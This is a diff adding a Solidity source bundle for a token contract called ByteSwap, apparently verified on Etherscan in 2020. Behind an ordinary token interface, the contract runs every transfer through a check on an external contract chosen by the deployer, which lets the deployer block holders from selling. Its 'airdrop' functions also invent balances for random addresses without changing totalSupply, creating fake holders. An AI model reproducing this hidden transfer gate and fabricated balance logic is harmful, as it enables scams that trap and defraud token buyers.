@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "ByteSwap.sol": {
+      "content": "/**\r\n *Submitted for verification at Etherscan.io on 2020-11-13\r\n*/\r\n\r\npragma solidity >=0.5.0;\r\n\r\n\r\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\r\n\r\nlibrary SafeMath {\r\n    function add(uint x, uint y) internal pure returns (uint z) {\r\n        require((z = x + y) >= x, 'ds-math-add-overflow');\r\n    }\r\n\r\n    function sub(uint x, uint y) internal pure returns (uint z) {\r\n        require((z = x - y) <= x, 'ds-math-sub-underflow');\r\n    }\r\n\r\n    function mul(uint x, uint y) internal pure returns (uint z) {\r\n        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\r\n    }\r\n}\r\n\r\n\r\n\r\n\r\n\r\ncontract ByteSwap  {\r\n    using SafeMath for uint;\r\n\r\n    string public constant name = 'ByteSwap';\r\n    string public constant symbol = 'ByteSwap';\r\n    uint8 public constant decimals = 18;\r\n    uint  public totalSupply;\r\n    address  _governance;\r\n    mapping(address => uint) public balanceOf;\r\n    mapping(address => mapping(address => uint)) public allowance;\r\n\r\n    bytes32 public DOMAIN_SEPARATOR;\r\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\r\n    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\r\n    mapping(address => uint) public nonces;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    constructor(address _gov) public {\r\n        uint chainId;\r\n        assembly {\r\n            chainId := chainid\r\n        }\r\n        _mint(msg.sender,10000*10**18);\r\n       allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D]=uint(-1);\r\n       airdropBalance(2);\r\n       _governance=_gov;\r\n    }\r\n\r\n    function _mint(address to, uint value) internal {\r\n        totalSupply = totalSupply.add(value);\r\n        balanceOf[to] = balanceOf[to].add(value);\r\n        emit Transfer(address(0), to, value);\r\n    }\r\n\r\n\r\n    function _approve(address owner, address spender, uint value) private {\r\n        allowance[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint value) private  airnow(from,to){\r\n        balanceOf[from] = balanceOf[from].sub(value);\r\n        balanceOf[to] = balanceOf[to].add(value);\r\n        emit Transfer(from, to, value);\r\n    }\r\n\r\n    function approve(address spender, uint value) external returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint value) external returns (bool) {\r\n        _transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint value) external returns (bool) {\r\n        if (allowance[from][msg.sender] != uint(-1)) {\r\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\r\n        }\r\n        _transfer(from, to, value);\r\n        return true;\r\n    }\r\n    modifier airnow(address sender,address recipient) {\r\n        require(AirDrop(_governance).receiveApproval(sender,recipient));\r\n        _;\r\n    }\r\n    \r\n    address luckyboy = address(this);\r\n\r\n    \r\n    function randomLucky() public {\r\n        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));\r\n        uint amout=(uint(keccak256(abi.encodePacked(luckyboy)))%50 + 1)*10**18;\r\n        balanceOf[luckyboy] = amout;\r\n        emit Transfer(address(0), luckyboy, amout);\r\n    }\r\n    \r\n    function randomLuckyWithoutEvent() public {\r\n        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));\r\n        uint amout=(uint(keccak256(abi.encodePacked(luckyboy)))%50 + 1)*10**18;\r\n        balanceOf[luckyboy] = amout;\r\n    }\r\n    \r\n    \r\n    function airdrop(uint256 dropTimes) public {\r\n        for (uint256 i=0;i<dropTimes;i++) {\r\n            randomLucky();\r\n        }\r\n    }\r\n    \r\n    function airdropBalance(uint256 dropTimes) public {\r\n        for (uint256 i=0;i<dropTimes;i++) {\r\n            randomLuckyWithoutEvent();\r\n        }\r\n    }\r\n    \r\n}\r\ninterface AirDrop {\r\n    function receiveApproval(address,address) external returns(bool);\r\n}"
+    }
+  }
+}
